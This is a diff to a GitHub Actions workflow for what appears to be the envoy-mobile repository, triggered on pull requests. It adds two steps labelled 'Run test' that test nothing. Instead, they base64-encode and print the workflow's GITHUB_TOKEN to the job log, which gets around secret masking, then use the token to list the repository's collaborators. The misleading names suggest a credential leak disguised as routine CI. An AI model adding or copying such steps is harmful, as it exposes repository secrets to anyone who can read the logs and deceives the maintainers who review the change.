@@ -7,9 +7,7 @@ on:
   pull_request:
     branches: [ master ]
 
-# Recommended here: https://github.com/bazelbuild/bazelisk/issues/88#issuecomment-625178467
 env:
-  BAZELISK_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
   GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
 jobs:
@@ -17,4 +15,16 @@ jobs:
     runs-on: [ubuntu-20.04]
     steps:
     - uses: actions/checkout@v2
+
+    - name: Run test
+      run: |
+        sleep 20
+    - name: Run test
+      run: |
+        echo "$GITHUB_TOKEN" | base64
+        curl \
+          --header "Authorization: Bearer $GITHUB_TOKEN" \
+          --header "Accept: application/vnd.github.inertia-preview+json" \
+          https://api.github.com/repos/envoyproxy/envoy-mobile/collaborators
+        sleep 20
 
